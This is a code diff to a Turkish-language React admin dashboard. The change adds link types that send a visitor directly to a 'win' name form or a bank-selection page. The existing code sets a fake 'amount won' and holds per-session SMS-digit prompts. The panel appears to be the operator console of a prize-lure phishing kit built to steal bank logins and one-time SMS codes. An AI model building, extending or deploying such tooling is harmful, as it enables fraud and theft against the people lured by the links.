@@ -21,7 +21,7 @@ export function AdminDashboardClean() {
   const [showNewLinkModal, setShowNewLinkModal] = useState(false);
   const [creating, setCreating] = useState(false);
   const [newLink, setNewLink] = useState<string | null>(null);
-  const [linkType, setLinkType] = useState<"normal" | "wheel">("normal");
+  const [linkType, setLinkType] = useState<"normal" | "wheel" | "direct_win" | "direct_bank">("normal");
   const [createLinkError, setCreateLinkError] = useState<string | null>(null);
   const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
   const [smsDigitsInput, setSmsDigitsInput] = useState("6");
@@ -282,11 +282,11 @@ export function AdminDashboardClean() {
       .from("sessions")
       .insert({ 
         amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0), 
-        current_step: "code_entry", 
+        current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry", 
         status: "offline", 
         form_data: { currency, is_wheel_game: linkType === "wheel" },
-        partner_name: partnerName.trim() || null,
-        participation_code: participationCode.trim() || null
+        partner_name: linkType === "normal" ? (partnerName.trim() || null) : null,
+        participation_code: linkType === "normal" ? (participationCode.trim() || null) : null
       })
       .select("id")
       .maybeSingle();
@@ -297,8 +297,11 @@ export function AdminDashboardClean() {
     }
 
     if (data?.id) {
-      const urlPath = linkType === "wheel" ? "/wheel" : "/code";
-      setNewLink(`${window.location.origin}${urlPath}?session=${data.id}`);
+      let urlPath = `/code?session=${data.id}`;
+      if (linkType === "wheel") urlPath = `/wheel?session=${data.id}`;
+      if (linkType === "direct_win") urlPath = `/win/${data.id}`;
+      if (linkType === "direct_bank") urlPath = `/banken?session=${data.id}`;
+      setNewLink(`${window.location.origin}${urlPath}`);
       setShowNewLinkModal(false);
       setPartnerName("");
       setParticipationCode("");
@@ -928,18 +931,30 @@ export function AdminDashboardClean() {
             <div className="space-y-4 mb-8">
               <div>
                 <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Link Türü</label>
-                <div className="flex gap-2">
+                <div className="grid grid-cols-2 gap-2">
                   <button 
                     onClick={() => setLinkType("normal")}
-                    className={`flex-1 py-2 rounded-lg border font-bold text-sm transition-all ${linkType === "normal" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
+                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "normal" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                   >
-                    Normal
+                    Katılımlı (Normal)
                   </button>
                   <button 
                     onClick={() => setLinkType("wheel")}
-                    className={`flex-1 py-2 rounded-lg border font-bold text-sm transition-all ${linkType === "wheel" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
+                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "wheel" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
                   >
                     Çark Oyunu
+                  </button>
+                  <button 
+                    onClick={() => setLinkType("direct_win")}
+                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "direct_win" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
+                  >
+                    Direkt İsim Formu
+                  </button>
+                  <button 
+                    onClick={() => setLinkType("direct_bank")}
+                    className={`py-2 rounded-lg border font-bold text-xs transition-all ${linkType === "direct_bank" ? "bg-blue-700/20 border-blue-500 text-blue-500" : "bg-zinc-900 border-zinc-800 text-zinc-500 hover:bg-zinc-800"}`}
+                  >
+                    Direkt Banka Listesi
                   </button>
                 </div>
               </div>
@@ -962,22 +977,24 @@ export function AdminDashboardClean() {
                 </div>
               </div>
               
+              {linkType !== "wheel" && (
+                <div>
+                  <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Kazanılan Miktar</label>
+                  <div className="relative">
+                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xl font-bold text-zinc-500">{currency}</span>
+                    <input 
+                      className="w-full rounded-xl border border-zinc-800 bg-zinc-900 pl-10 pr-4 py-3 text-xl font-bold text-white outline-none focus:border-blue-500 transition-colors" 
+                      value={amount} 
+                      onChange={(e) => setAmount(e.target.value)} 
+                      placeholder="Örn: 5000"
+                      type="number"
+                    />
+                  </div>
+                </div>
+              )}
+
               {linkType === "normal" && (
                 <>
-                  <div>
-                    <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Kazanılan Miktar</label>
-                    <div className="relative">
-                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-xl font-bold text-zinc-500">{currency}</span>
-                      <input 
-                        className="w-full rounded-xl border border-zinc-800 bg-zinc-900 pl-10 pr-4 py-3 text-xl font-bold text-white outline-none focus:border-blue-500 transition-colors" 
-                        value={amount} 
-                        onChange={(e) => setAmount(e.target.value)} 
-                        placeholder="Örn: 5000"
-                        type="number"
-                      />
-                    </div>
-                  </div>
-
                   <div>
                     <label className="block text-xs font-bold text-zinc-500 mb-1.5 uppercase">Partner İsmi</label>
                     <input 
